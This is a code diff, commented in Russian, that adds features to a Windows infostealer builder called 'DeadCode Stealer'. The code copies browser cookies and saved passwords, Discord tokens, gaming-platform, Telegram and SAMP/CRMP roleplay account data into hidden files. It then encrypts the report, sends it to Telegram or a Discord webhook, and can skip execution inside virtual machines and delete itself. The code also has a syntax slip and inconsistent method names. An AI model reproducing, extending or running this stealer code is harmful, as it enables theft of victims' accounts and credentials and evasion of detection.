@@ -17,6 +17,7 @@
 #include <QPixmap>
 #include <QJsonDocument>
 #include <QJsonObject>
+#include <QJsonArray>
 #include <QNetworkReply>
 #include <QHttpMultiPart>
 #include <QHostInfo>
@@ -27,12 +28,15 @@
 #include <QThread>
 #include <QSysInfo>
 #include <QClipboard>
+#include <QPainter>
+#include <QScrollBar>
 #include <random>
 #include <sstream>
 #include <iomanip>
 #include <filesystem>
 #include <vector>
 #include <string>
+#include <set>
 #include <fstream>
 #include <windows.h>
 #include <bcrypt.h>
@@ -45,6 +49,8 @@
 #include <iphlpapi.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
+#include <QThreadPool> // Добавлено для многопоточности
+#include <QRunnable>   // Добавлено для многопоточности
 
 // Зашифрованные строки
 const std::string encryptedDiscordPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\discord\\Local Storage\\leveldb\\"
@@ -69,7 +75,11 @@ MainWindow* g_mainWindow = nullptr;
 // Функция для получения данных от libcurl
 static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
     size_t newLength = size * nmemb;
-    s->append((char*)contents, newLength);
+    try {
+        s->append(static_cast<char*>(contents), newLength);
+    } catch (const std::exception& e) {
+        return 0; // Ошибка записи
+    }
     return newLength;
 }
 
@@ -116,8 +126,8 @@ void MainWindow::updateConfigFromUI() {
     if (autoStartCheckBox) config.autoStart = autoStartCheckBox->isChecked();
     if (persistCheckBox) config.persist = persistCheckBox->isChecked();
     if (selfDestructCheckBox) config.selfDestruct = selfDestructCheckBox->isChecked();
-    if (arizonaRPCheckBox) config.arizonaRP = arizonaRPCheckBox->isChecked();  // Исправлено на arizonaRP
-    if (radmirRPCheckBox) config.radmirRP = radmirRPCheckBox->isChecked();     // Исправлено на radmirRP
+    if (arizonaRPCheckBox) config.arizonaRP = arizonaRPCheckBox->isChecked();
+    if (radmirRPCheckBox) config.radmirRP = radmirRPCheckBox->isChecked();
 }
 
 // Реализация метода decryptString как метода класса
@@ -132,11 +142,11 @@ std::string MainWindow::decryptString(const std::string& encrypted, size_t keyOf
 // Вспомогательная функция для расшифровки данных через DPAPI
 QByteArray MainWindow::decryptDPAPIData(const QByteArray& encryptedData) {
     DATA_BLOB inBlob, outBlob;
-    inBlob.pbData = (BYTE*)encryptedData.data();
-    inBlob.cbData = encryptedData.size();
+    inBlob.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(encryptedData.data()));
+    inBlob.cbData = static_cast<DWORD>(encryptedData.size());
 
     if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
-        QByteArray decryptedData((char*)outBlob.pbData, outBlob.cbData);
+        QByteArray decryptedData(reinterpret_cast<char*>(outBlob.pbData), static_cast<int>(outBlob.cbData));
         LocalFree(outBlob.pbData);
         return decryptedData;
     } else {
@@ -144,6 +154,34 @@ QByteArray MainWindow::decryptDPAPIData(const QByteArray& encryptedData) {
         return QByteArray();
     }
 }
+
+// Класс для многопоточного сбора данных
+class DataStealer : public QRunnable {
+public:
+    DataStealer(MainWindow* mw, const std::string& tempDir, const std::string& type)
+        : mw(mw), tempDir(tempDir), type(type) {}
+    void run() override {
+        std::string result;
+        if (type == "systemInfo") result = mw->collectSystemInfo(tempDir);
+        else if (type == "discord") result = mw->StealDiscordTokens(tempDir);
+        else if (type == "steam") result = mw->StealSteamData(tempDir);
+        else if (type == "telegram") result = mw->StealTelegramData(tempDir);
+        else if (type == "epic") result = mw->StealEpicGamesData(tempDir);
+        else if (type == "roblox") result = mw->StealRobloxData(tempDir);
+        else if (type == "battlenet") result = mw->StealBattleNetData(tempDir);
+        else if (type == "minecraft") result = mw->StealMinecraftData(tempDir);
+        else if (type == "browser") result = mw->stealBrowserData(tempDir);
+        else if (type == "chatHistory") result = mw->stealChatHistory(tempDir);
+        else if (type == "socialEngineering") result = mw->collectSocialEngineeringData(tempDir);
+        else if (type == "arizonaRP") result = mw->StealArizonaData(tempDir);
+        else if (type == "radmirRP") result = mw->StealRadmirData(tempDir);
+        mw->collectedData[type] = result;
+    }
+private:
+    MainWindow* mw;
+    std::string tempDir;
+    std::string type;
+};
 
 // Конструктор
 MainWindow::MainWindow(QWidget *parent)
@@ -188,8 +226,8 @@ MainWindow::MainWindow(QWidget *parent)
     autoStartCheckBox = ui->autoStartCheckBox;
     persistCheckBox = ui->persistCheckBox;
     selfDestructCheckBox = ui->selfDestructCheckBox;
-    arizonaRPCheckBox = ui->arizonaRPCheckBox;  // Исправлено на arizonaRPCheckBox
-    radmirRPCheckBox = ui->radmirRPCheckBox;    // Исправлено на radmirRPCheckBox
+    arizonaRPCheckBox = ui->arizonaRPCheckBox;
+    radmirRPCheckBox = ui->radmirRPCheckBox;
     textEdit = ui->textEdit;
     iconBrowseButton = ui->iconBrowseButton;
     buildButton = ui->buildButton;
@@ -210,8 +248,8 @@ MainWindow::MainWindow(QWidget *parent)
     QSettings settings("DeadCode", "Stealer");
     config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
     config.selfDestruct = settings.value("selfDestruct", false).toBool();
-    config.arizonaRP = settings.value("arizonaRP", false).toBool();  // Исправлено на arizonaRP
-    config.radmirRP = settings.value("radmirRP", false).toBool();    // Исправлено на radmirRP
+    config.arizonaRP = settings.value("arizonaRP", false).toBool();
+    config.radmirRP = settings.value("radmirRP", false).toBool();
 
     // Установка начальных значений из config
     if (sendMethodComboBox) sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
@@ -244,8 +282,8 @@ MainWindow::MainWindow(QWidget *parent)
     if (autoStartCheckBox) autoStartCheckBox->setChecked(config.autoStart);
     if (persistCheckBox) persistCheckBox->setChecked(config.persist);
     if (selfDestructCheckBox) selfDestructCheckBox->setChecked(config.selfDestruct);
-    if (arizonaRPCheckBox) arizonaRPCheckBox->setChecked(config.arizonaRP);  // Исправлено на arizonaRP
-    if (radmirRPCheckBox) radmirRPCheckBox->setChecked(config.radmirRP);     // Исправлено на radmirRP
+    if (arizonaRPCheckBox) arizonaRPCheckBox->setChecked(config.arizonaRP);
+    if (radmirRPCheckBox) radmirRPCheckBox->setChecked(config.radmirRP);
 
     // Анимация для логотипа
     if (ui->logoLabel) {
@@ -324,11 +362,80 @@ MainWindow::~MainWindow() {
     delete statusCheckTimer;
 }
 
-// Реализация StealAndSendData с шаблоном вывода
+// Вспомогательный метод для кражи данных из Chromium-браузеров
+std::string MainWindow::stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir) {
+    std::string result;
+    std::string cookiesPath = profilePath + "\\Cookies";
+    std::string passwordsPath = profilePath + "\\Login Data";
+    std::string destCookies = tempDir + "\\" + browserName + "_Cookies";
+    std::string destPasswords = tempDir + "\\" + browserName + "_Login_Data";
+
+    try {
+        if (std::filesystem::exists(cookiesPath) && config.cookies) {
+            std::filesystem::copy_file(cookiesPath, destCookies, std::filesystem::copy_options::overwrite_existing);
+            collectedFiles.push_back(destCookies);
+            result += browserName + " cookies stolen successfully.\n";
+        }
+        if (std::filesystem::exists(passwordsPath) && config.passwords) {
+            std::filesystem::copy_file(passwordsPath, destPasswords, std::filesystem::copy_options::overwrite_existing);
+            collectedFiles.push_back(destPasswords);
+            result += browserName + " passwords stolen successfully.\n";
+        }
+    } catch (const std::exception& e) {
+        result += "Error stealing " + browserName + " data: " + e.what() + "\n";
+    }
+    return result;
+}
+
+// Обновленный метод stealBrowserData
+std::string MainWindow::stealBrowserData(const std::string& tempDir) {
+    std::stringstream output;
+    if (config.cookies || config.passwords) {
+        output << "Stealing browser data...\n";
+
+        std::vector<std::pair<std::string, std::string>> browsers = {
+            {"Chrome", std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default"},
+            {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"},
+            {"OperaGX", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera GX Stable"},
+            {"Edge", std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Default"},
+            {"Brave", std::string(getenv("LOCALAPPDATA")) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
+            {"Yandex", std::string(getenv("LOCALAPPDATA")) + "\\Yandex\\YandexBrowser\\User Data\\Default"}
+        };
+
+        for (const auto& [name, path] : browsers) {
+            if (std::filesystem::exists(path)) {
+                emitLog("Сбор данных браузера: " + QString::fromStdString(name));
+                output << stealChromiumBrowserData(path, name, tempDir);
+            } else {
+                emitLog("Директория " + QString::fromStdString(name) + " не найдена, пропускаем...");
+            }
+        }
+    }
+    return output.str();
+}
+
+// Обновленный метод saveToLocalFile
+void MainWindow::saveToLocalFile(const std::string& data, const std::string& tempDir) {
+    std::string persistPath = tempDir + "\\" + config.filename;
+    std::ofstream file(persistPath, std::ios::binary);
+    if (file.is_open()) {
+        file << data;
+        file.close();
+        // Устанавливаем атрибут скрытого файла
+        if (SetFileAttributesA(persistPath.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
+            emitLog("Файл сохранен и скрыт: " + QString::fromStdString(persistPath));
+        } else {
+            emitLog("Ошибка установки атрибута скрытия для файла: " + QString::number(GetLastError()));
+        }
+    } else {
+        emitLog("Ошибка: Не удалось сохранить файл " + QString::fromStdString(persistPath));
+    }
+}
+
+// Обновленный метод StealAndSendData с многопоточностью
 void MainWindow::StealAndSendData(const std::string& tempDir) {
     emitLog("Запуск процесса кражи и отправки данных в " + QString::fromStdString(tempDir));
 
-    // Проверка на виртуальную машину
     if (config.antiVM && isRunningInVM()) {
         emitLog("Обнаружена виртуальная машина, процесс остановлен");
         if (config.fakeError) {
@@ -337,69 +444,64 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         return;
     }
 
-    // Обновление конфигурации из UI
     updateConfigFromUI();
 
-    // Создание временной директории
-    std::filesystem::create_directories(tempDir);
+    try {
+        std::filesystem::create_directories(tempDir);
+    } catch (const std::exception& e) {
+        emitLog("Ошибка создания директории: " + QString::fromStdString(e.what()));
+        return;
+    }
     collectedFiles.clear();
     collectedData.clear();
 
-    // Собираем данные
     std::stringstream output;
     output << "=== DeadCode Stealer Report ===\n";
     output << "Date: " << QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss").toStdString() << "\n";
     output << "Victim: " << QHostInfo::localHostName().toStdString() << "\n\n";
 
-    if (config.systemInfo) {
-        output << "[System Info]\n" << collectSystemInfo(tempDir) << "\n";
-    }
+    QThreadPool pool;
+    pool.setMaxThreadCount(QThread::idealThreadCount());
+
+    if (config.systemInfo) pool.start(new DataStealer(this, tempDir, "systemInfo"));
+    if (config.discord) pool.start(new DataStealer(this, tempDir, "discord"));
+    if (config.steam) pool.start(new DataStealer(this, tempDir, "steam"]);
+    if (config.telegram) pool.start(new DataStealer(this, tempDir, "telegram"));
+    if (config.epic) pool.start(new DataStealer(this, tempDir, "epic"));
+    if (config.roblox) pool.start(new DataStealer(this, tempDir, "roblox"));
+    if (config.battlenet) pool.start(new DataStealer(this, tempDir, "battlenet"));
+    if (config.minecraft) pool.start(new DataStealer(this, tempDir, "minecraft"));
+    if (config.cookies || config.passwords) pool.start(new DataStealer(this, tempDir, "browser"));
+    if (config.chatHistory) pool.start(new DataStealer(this, tempDir, "chatHistory"));
+    if (config.socialEngineering) pool.start(new DataStealer(this, tempDir, "socialEngineering"));
+    if (config.arizonaRP) pool.start(new DataStealer(this, tempDir, "arizonaRP"));
+    if (config.radmirRP) pool.start(new DataStealer(this, tempDir, "radmirRP"));
+
     if (config.screenshot) {
         std::string screenshotPath = TakeScreenshot(tempDir);
         if (!screenshotPath.empty()) collectedFiles.push_back(screenshotPath);
-    }
-    if (config.discord) {
-        output << "[Discord Tokens]\n" << StealDiscordTokens(tempDir) << "\n";
-    }
-    if (config.steam) {
-        output << "[Steam Data]\n" << StealSteamData(tempDir) << "\n";
-    }
-    if (config.telegram) {
-        output << "[Telegram Data]\n" << StealTelegramData(tempDir) << "\n";
-    }
-    if (config.epic) {
-        output << "[Epic Games Data]\n" << StealEpicGamesData(tempDir) << "\n";
-    }
-    if (config.roblox) {
-        output << "[Roblox Data]\n" << StealRobloxData(tempDir) << "\n";
-    }
-    if (config.battlenet) {
-        output << "[Battle.net Data]\n" << StealBattleNetData(tempDir) << "\n";
-    }
-    if (config.minecraft) {
-        output << "[Minecraft Data]\n" << StealMinecraftData(tempDir) << "\n";
-    }
-    if (config.cookies || config.passwords) {
-        output << "[Browser Data]\n" << stealBrowserData(tempDir) << "\n";
-    }
-    if (config.chatHistory) {
-        output << "[Chat History]\n" << stealChatHistory(tempDir) << "\n";
-    }
-    if (config.socialEngineering) {
-        output << "[Social Engineering Data]\n" << collectSocialEngineeringData(tempDir) << "\n";
     }
     if (config.fileGrabber) {
         std::vector<std::string> grabbedFiles = GrabFiles(tempDir);
         collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
     }
-    if (config.arizona) {
-        output << "[GTA SAMP Arizona Data]\n" << StealArizonaData(tempDir) << "\n";
-    }
-    if (config.radmir) {
-        output << "[CRMP Radmir RolePlay Data]\n" << StealRadmirData(tempDir) << "\n";
-    }
 
-    // Сохранение данных в файл
+    pool.waitForDone();
+
+    if (config.systemInfo) output << "[System Info]\n" << collectedData["systemInfo"] << "\n";
+    if (config.discord) output << "[Discord Tokens]\n" << collectedData["discord"] << "\n";
+    if (config.steam) output << "[Steam Data]\n" << collectedData["steam"] << "\n";
+    if (config.telegram) output << "[Telegram Data]\n" << collectedData["telegram"] << "\n";
+    if (config.epic) output << "[Epic Games Data]\n" << collectedData["epic"] << "\n";
+    if (config.roblox) output << "[Roblox Data]\n" << collectedData["roblox"] << "\n";
+    if (config.battlenet) output << "[Battle.net Data]\n" << collectedData["battlenet"] << "\n";
+    if (config.minecraft) output << "[Minecraft Data]\n" << collectedData["minecraft"] << "\n";
+    if (config.cookies || config.passwords) output << "[Browser Data]\n" << collectedData["browser"] << "\n";
+    if (config.chatHistory) output << "[Chat History]\n" << collectedData["chatHistory"] << "\n";
+    if (config.socialEngineering) output << "[Social Engineering Data]\n" << collectedData["socialEngineering"] << "\n";
+    if (config.arizonaRP) output << "[GTA SAMP Arizona Data]\n" << collectedData["arizonaRP"] << "\n";
+    if (config.radmirRP) output << "[CRMP Radmir RolePlay Data]\n" << collectedData["radmirRP"] << "\n";
+
     std::string reportPath = tempDir + "\\report.txt";
     std::ofstream reportFile(reportPath);
     if (reportFile.is_open()) {
@@ -410,14 +512,12 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         emitLog("Ошибка: Не удалось сохранить отчет в " + QString::fromStdString(reportPath));
     }
 
-    // Шифрование данных
     std::string encryptedData = encryptData(output.str());
     if (encryptedData.empty()) {
         emitLog("Ошибка: Не удалось зашифровать данные");
         return;
     }
 
-    // Отправка данных
     if (config.sendMethod == "Telegram") {
         sendToTelegram(encryptedData, collectedFiles);
     } else if (config.sendMethod == "Discord") {
@@ -426,98 +526,187 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         saveToLocalFile(encryptedData, tempDir);
     }
 
-    // Самоуничтожение
     if (config.selfDestruct) {
-        std::filesystem::remove_all(tempDir);
-        emitLog("Самоуничтожение: Временная директория удалена");
-        char exePath[MAX_PATH];
-        GetModuleFileNameA(NULL, exePath, MAX_PATH);
-        std::string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > NUL & del \"" + std::string(exePath) + "\"";
-        system(cmd.c_str());
+        try {
+            std::filesystem::remove_all(tempDir);
+            emitLog("Самоуничтожение: Временная директория удалена");
+            char exePath[MAX_PATH];
+            if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+                std::string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > NUL & del \"" + std::string(exePath) + "\"";
+                system(cmd.c_str());
+            } else {
+                emitLog("Ошибка получения пути к исполняемому файлу для самоуничтожения");
+            }
+        } catch (const std::exception& e) {
+            emitLog("Ошибка самоуничтожения: " + QString::fromStdString(e.what()));
+        }
     }
 }
 
-// Реализация StealArizonaData
-std::string MainWindow::StealArizonaData(const std::string& dir) {
-    emitLog("Кража данных GTA SAMP Arizona...");
+// Реализация StealArizonaRPData (Arizona RP на SAMP)
+std::string MainWindow::StealArizonaRPData(const std::string& dir) {
+    emitLog("Начало кражи данных Arizona RP (SAMP)...");
 
-    std::string arizonaPath = std::string(getenv("APPDATA")) + "\\Arizona Games\\";
-    if (!std::filesystem::exists(arizonaPath)) {
-        emitLog("Директория Arizona Games не найдена");
-        return "Not found";
+    std::string arizonaDir = dir + "\\ArizonaRPData";
+    std::filesystem::create_directories(arizonaDir);
+
+    std::string result;
+
+    // Получаем путь к APPDATA
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA для Arizona RP");
+        free(appDataPath);
+        return "";
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
+
+    // Путь к samp.ini (конфигурация SAMP)
+    std::string sampConfigPath = appData + "\\SA-MP\\samp.ini";
+    if (std::filesystem::exists(sampConfigPath)) {
+        std::string arizonaConfigPath = arizonaDir + "\\arizona_samp_config.txt";
+        std::filesystem::copy_file(sampConfigPath, arizonaConfigPath, std::filesystem::copy_options::overwrite_existing);
+        SetFileAttributesA(arizonaConfigPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+        collectedFiles.push_back(arizonaConfigPath);
+
+        // Читаем файл для извлечения данных
+        std::ifstream configFile(sampConfigPath);
+        std::string line, configContent;
+        while (std::getline(configFile, line)) {
+            configContent += line + "\n";
+            // Ищем никнейм и сервер (Arizona RP)
+            if (line.find("last_nick") != std::string::npos || 
+                line.find("server") != std::string::npos) {
+                result += "Arizona RP (SAMP): " + line + "\n";
+            }
+        }
+        configFile.close();
+
+        // Сохраняем содержимое
+        std::ofstream outFile(arizonaConfigPath);
+        if (outFile.is_open()) {
+            outFile << configContent;
+            outFile.close();
+            emitLog("Конфигурация Arizona RP (SAMP) сохранена и скрыта: " + QString::fromStdString(arizonaConfigPath));
+        } else {
+            emitLog("Ошибка: Не удалось сохранить конфигурацию Arizona RP");
+        }
+    } else {
+        emitLog("Файл samp.ini для Arizona RP не найден");
     }
 
-    std::stringstream result;
-    result << "Arizona Games Data:\n";
-
-    // Поиск конфигурационных файлов
-    for (const auto& entry : std::filesystem::recursive_directory_iterator(arizonaPath)) {
-        if (entry.path().extension() == ".ini" || entry.path().extension() == ".cfg") {
-            std::string filePath = entry.path().string();
-            std::string destPath = dir + "\\Arizona_" + entry.path().filename().string();
-            try {
-                std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
-                collectedFiles.push_back(destPath);
-
-                std::ifstream file(filePath);
-                std::string line;
-                while (std::getline(file, line)) {
-                    if (line.find("login") != std::string::npos || line.find("password") != std::string::npos) {
-                        result << line << "\n";
-                    }
-                }
-                file.close();
-            } catch (const std::exception& e) {
-                emitLog("Ошибка копирования файла Arizona: " + QString::fromStdString(e.what()));
+    // Проверка кэша SAMP (USERDATA)
+    std::string sampCachePath = appData + "\\SA-MP\\USERDATA";
+    if (std::filesystem::exists(sampCachePath)) {
+        for (const auto& entry : std::filesystem::directory_iterator(sampCachePath)) {
+            std::string fileName = entry.path().filename().string();
+            // Ищем файлы, связанные с Arizona RP (например, по имени сервера)
+            if (fileName.find("arizona") != std::string::npos || fileName.find(".dat") != std::string::npos) {
+                std::string destFilePath = arizonaDir + "\\" + fileName;
+                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
+                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+                collectedFiles.push_back(destFilePath);
+                result += "Arizona RP (SAMP) Cache: " + fileName + "\n";
+                emitLog("Кэш Arizona RP (SAMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
             }
         }
     }
 
-    emitLog("Данные Arizona успешно собраны");
-    return result.str();
-}
-
-// Реализация StealRadmirData
-std::string MainWindow::StealRadmirData(const std::string& dir) {
-    emitLog("Кража данных CRMP Radmir RolePlay...");
-
-    std::string radmirPath = std::string(getenv("APPDATA")) + "\\Radmir CRMP\\";
-    if (!std::filesystem::exists(radmirPath)) {
-        emitLog("Директория Radmir CRMP не найдена");
-        return "Not found";
+    if (result.empty()) {
+        emitLog("Данные Arizona RP (SAMP) не найдены");
+        std::filesystem::remove_all(arizonaDir);
+        return "";
     }
 
-    std::stringstream result;
-    result << "Radmir CRMP Data:\n";
+    emitLog("Кража данных Arizona RP (SAMP) завершена");
+    return result;
+}
 
-    // Поиск конфигурационных файлов
-    for (const auto& entry : std::filesystem::recursive_directory_iterator(radmirPath)) {
-        if (entry.path().extension() == ".ini" || entry.path().extension() == ".cfg") {
-            std::string filePath = entry.path().string();
-            std::string destPath = dir + "\\Radmir_" + entry.path().filename().string();
-            try {
-                std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
-                collectedFiles.push_back(destPath);
+// Реализация StealRadmirRPData (Radmir RP на CRMP)
+std::string MainWindow::StealRadmirRPData(const std::string& dir) {
+    emitLog("Начало кражи данных Radmir RP (CRMP)...");
 
-                std::ifstream file(filePath);
-                std::string line;
-                while (std::getline(file, line)) {
-                    if (line.find("login") != std::string::npos || line.find("password") != std::string::npos) {
-                        result << line << "\n";
-                    }
-                }
-                file.close();
-            } catch (const std::exception& e) {
-                emitLog("Ошибка копирования файла Radmir: " + QString::fromStdString(e.what()));
+    std::string radmirDir = dir + "\\RadmirRPData";
+    std::filesystem::create_directories(radmirDir);
+
+    std::string result;
+
+    // Получаем путь к APPDATA
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA для Radmir RP");
+        free(appDataPath);
+        return "";
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
+
+    // Путь к settings.ini (конфигурация Radmir CRMP)
+    std::string radmirConfigPath = appData + "\\RadmirCRMP\\settings.ini";
+    if (std::filesystem::exists(radmirConfigPath)) {
+        std::string radmirDestPath = radmirDir + "\\radmir_config.txt";
+        std::filesystem::copy_file(radmirConfigPath, radmirDestPath, std::filesystem::copy_options::overwrite_existing);
+        SetFileAttributesA(radmirDestPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+        collectedFiles.push_back(radmirDestPath);
+
+        // Читаем файл для извлечения данных
+        std::ifstream configFile(radmirConfigPath);
+        std::string line, configContent;
+        while (std::getline(configFile, line)) {
+            configContent += line + "\n";
+            // Ищем никнейм, сервер или сессионные данные
+            if (line.find("nickname") != std::string::npos || 
+                line.find("server") != std::string::npos || 
+                line.find("session") != std::string::npos) {
+                result += "Radmir RP (CRMP): " + line + "\n";
+            }
+        }
+        configFile.close();
+
+        // Сохраняем содержимое
+        std::ofstream outFile(radmirDestPath);
+        if (outFile.is_open()) {
+            outFile << configContent;
+            outFile.close();
+            emitLog("Конфигурация Radmir RP (CRMP) сохранена и скрыта: " + QString::fromStdString(radmirDestPath));
+        } else {
+            emitLog("Ошибка: Не удалось сохранить конфигурацию Radmir RP");
+        }
+    } else {
+        emitLog("Файл settings.ini для Radmir RP (CRMP) не найден");
+    }
+
+    // Проверка кэша Radmir CRMP (например, USERDATA или logs)
+    std::string radmirCachePath = appData + "\\RadmirCRMP\\USERDATA";
+    if (std::filesystem::exists(radmirCachePath)) {
+        for (const auto& entry : std::filesystem::directory_iterator(radmirCachePath)) {
+            std::string fileName = entry.path().filename().string();
+            // Ищем файлы, связанные с Radmir RP
+            if (fileName.find("radmir") != std::string::npos || fileName.find(".dat") != std::string::npos) {
+                std::string destFilePath = radmirDir + "\\" + fileName;
+                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
+                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+                collectedFiles.push_back(destFilePath);
+                result += "Radmir RP (CRMP) Cache: " + fileName + "\n";
+                emitLog("Кэш Radmir RP (CRMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
             }
         }
     }
 
-    emitLog("Данные Radmir успешно собраны");
-    return result.str();
+    if (result.empty()) {
+        emitLog("Данные Radmir RP (CRMP) не найдены");
+        std::filesystem::remove_all(radmirDir);
+        return "";
+    }
+
+    emitLog("Кража данных Radmir RP (CRMP) завершена");
+    return result;
 }
 
-// Остальные методы остаются без изменений до следующей части
+// Реализация animateSection
 void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
     if (!sectionLabel) return;
 
@@ -567,6 +756,7 @@ void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
     });
 }
 
+// Реализация generateRandomString
 std::string MainWindow::generateRandomString(size_t length) {
     static const char alphanum[] =
         "0123456789"
@@ -586,6 +776,7 @@ std::string MainWindow::generateRandomString(size_t length) {
     return result;
 }
 
+// Реализация generateUniqueXorKey
 std::string MainWindow::generateUniqueXorKey() {
     std::random_device rd;
     std::mt19937 gen(rd());
@@ -597,6 +788,7 @@ std::string MainWindow::generateUniqueXorKey() {
     return ss.str();
 }
 
+// Реализация GetEncryptionKey
 std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
     std::string keyStr = useFirstKey ? encryptionKey1 : encryptionKey2;
     if (keyStr.empty()) {
@@ -606,9 +798,7 @@ std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
     }
     std::array<unsigned char, 16> key;
     if (keyStr.length() >= 16) {
-        for (size_t i = 0; i < 16; ++i) {
-            key[i] = static_cast<unsigned char>(keyStr[i]);
-        }
+        std::copy_n(keyStr.begin(), 16, key.begin());
     } else {
         for (size_t i = 0; i < 16; ++i) {
             key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
@@ -617,6 +807,7 @@ std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
     return key;
 }
 
+// Реализация generateIV
 std::array<unsigned char, 16> MainWindow::generateIV() {
     std::array<unsigned char, 16> iv;
     if (RAND_bytes(iv.data(), iv.size()) != 1) {
@@ -626,12 +817,13 @@ std::array<unsigned char, 16> MainWindow::generateIV() {
     return iv;
 }
 
+// Реализация isRunningInVM
 bool MainWindow::isRunningInVM() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         char buffer[1024];
         DWORD size = sizeof(buffer);
-        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &size) == ERROR_SUCCESS) {
             std::string biosVersion(buffer);
             if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                 RegCloseKey(hKey);
@@ -643,6 +835,7 @@ bool MainWindow::isRunningInVM() {
     return false;
 }
 
+// Реализация applyXOR
 QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
     QByteArray result = data;
     for (int i = 0; i < data.size(); ++i) {
@@ -651,6 +844,7 @@ QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigne
     return result;
 }
 
+// Реализация applyAES
 QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
     QByteArray result;
     BCRYPT_ALG_HANDLE hAlg = nullptr;
@@ -663,14 +857,14 @@ QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigne
         return QByteArray();
     }
 
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_CBC)), sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     if (!BCRYPT_SUCCESS(status)) {
         emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
         BCryptCloseAlgorithmProvider(hAlg, 0);
         return QByteArray();
     }
 
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, const_cast<PUCHAR>(key.data()), static_cast<ULONG>(key.size()), 0);
     if (!BCRYPT_SUCCESS(status)) {
         emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
         BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -678,11 +872,11 @@ QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigne
     }
 
     DWORD bytesEncrypted = 0;
-    DWORD resultSize = data.size() + 16;
+    DWORD resultSize = static_cast<DWORD>(data.size() + 16); // Дополнительное место под padding
     std::vector<UCHAR> encryptedData(resultSize);
 
-    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
-                           encryptedData.data(), resultSize, &bytesEncrypted, 0);
